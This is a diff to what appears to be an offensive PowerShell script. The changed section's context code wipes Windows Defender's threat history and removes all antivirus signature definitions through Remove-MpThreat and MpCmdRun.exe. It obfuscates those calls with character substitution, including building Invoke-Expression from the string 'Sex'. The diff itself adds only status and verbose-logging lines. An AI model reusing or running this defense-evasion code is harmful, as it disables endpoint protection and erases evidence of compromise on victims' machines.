@@ -360,6 +360,8 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
       #>
 
       $IPATH = (Get-Location).Path
+      Write-Host "[-] Cleaning: Remove threats\signatures from defender!" -ForegroundColor Blue
+
       Try{#Remove threats\signatures from defender vault
           $RemoveMyName = "@Re@mov@e-@MpTh@re@at" -replace '@',''
           "$RemoveMyName"|&('Sex' -replace 'S','I')
@@ -369,6 +371,12 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
              $MamaMia = ".\Mp@Cm@dR'u@n.e@xe -'Re@m@ov@eD'ef@ini@t'io@ns -@Al@l'|Out-Null" -replace '(@|'')',''
              cd "$Env:PROGRAMDATA\Microsoft\Windows Defender\Platform\$PlatformVersion"
              "$MamaMia"|&('SEX' -replace 'S','i')
+
+             If($Verb -ieq "True")
+             {
+                $Lavado = $MamaMia -replace '^(\.)',''
+                write-host "    verbose : $Env:PROGRAMDATA\Microsoft\Windows Defender\Platform\${PlatformVersion}${Lavado}"
+             }
           }
       }Catch{Throw $_}
       cd $IPATH
